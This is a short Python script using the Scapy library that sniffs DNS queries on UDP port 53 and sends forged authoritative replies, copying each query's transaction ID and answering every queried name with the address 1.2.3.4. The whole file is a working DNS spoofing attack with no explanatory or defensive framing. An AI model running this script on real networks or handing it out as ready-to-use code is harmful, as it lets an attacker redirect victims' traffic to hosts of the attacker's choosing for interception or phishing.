from scapy.all import *


def dns_responder(pkt):
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
        # Check if it's a DNS query (opcode 0) and no answers yet
        spoofed_pkt = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst)
            / UDP(dport=pkt[UDP].sport, sport=53)
            / DNS(
                id=pkt[DNS].id,
                qd=pkt[DNS].qd,
                aa=1,
                qr=1,
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="1.2.3.4"),
            )
        )
        send(spoofed_pkt, verbose=0)


# Sniff DNS queries and invoke the dns_responder function
sniff(filter="udp and port 53", prn=dns_responder)
